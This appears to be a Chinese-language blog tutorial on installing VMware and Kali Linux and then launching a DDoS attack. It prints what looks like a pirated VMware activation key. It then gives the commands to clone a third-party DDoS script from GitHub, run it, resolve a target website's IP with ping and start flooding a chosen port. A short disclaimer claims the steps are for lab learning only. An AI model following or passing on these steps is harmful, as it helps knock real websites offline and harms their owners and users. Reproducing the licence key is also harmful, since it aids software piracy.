---
title: "Kali安装并实操DDOS攻击"
published: 2025-10-06
description: ""
tags: ["ddos", "kali", "linux", "vmware"]
category: "article"
draft: false
---

一、准备

1.[VMware虚拟机](https://www.vmware.com/)（如下载过程太慢可自行搜索xx软件园下载）  
2.[Kali系统镜像](https://www.kali.org/get-kali/#kali-virtual-machines)（如下载过程太慢可自行搜索xx大学镜像站下载）

二、安装

1.双击VMware安装程序，一直点击“下一步”，等待安装完成。安装后输入激活码。

```
MC60H-DWHD5-H80U9-6V85M-8280D
```

  
2.将Kali系统镜像文件解压到一个方便找到的位置（不建议放C盘）。解压后是VMware用的.vmdk文件。  
3.在VMware里选择“打开虚拟机”，然后选中解压后文件夹里的.vmdk文件，虚拟机就创建好了。启动虚拟机，在启动选择界面直接回车，进入登录页面。默认用户名kali，默认密码kali。  
4.进入桌面后，在桌面右键，新建一个终端，进行提权。

```
sudo su
```

```
kali
```

  
5.切换中文

```
dpkg-reconfigure locales
```

用方向键一直选到zh\_CN.UTF-8，空格选中，回车确认安装中文支持。  
安装完成后，重启系统，重新登录后，弹出更改提示，点击“不更改”。

```
reboo
```

  
5.升级软件包列表。

```
sudo apt update
```

三、进行 DDoS 攻击

【重要声明】本教程所有操作均在虚拟机环境运行，用于学习目的。未经授权对他人网络或系统进行 DDos 攻击是违法行为。  
1.打开终端，进行提权，克隆项目。

```
git clone https://github.com/Elsa-zlt/DDos-Attack
```

2.进入项目目录

```
cd DDos-Attack
```

3.修改文件权限

```
chmod +x ddos-attack.py
```

4.运行代码

```
python3 ddos-attack.py
```

5.新开一个终端，使用 ping 命令获取目标网站的IP地址  
6.回到运行攻击脚本的终端，输入获取到的IP地址，回车，输入端口号（如80），回车。  
7.等待进度条读完，攻击便开始了。要停止时，可以按快捷键Ctrl+C或直接关闭终端。
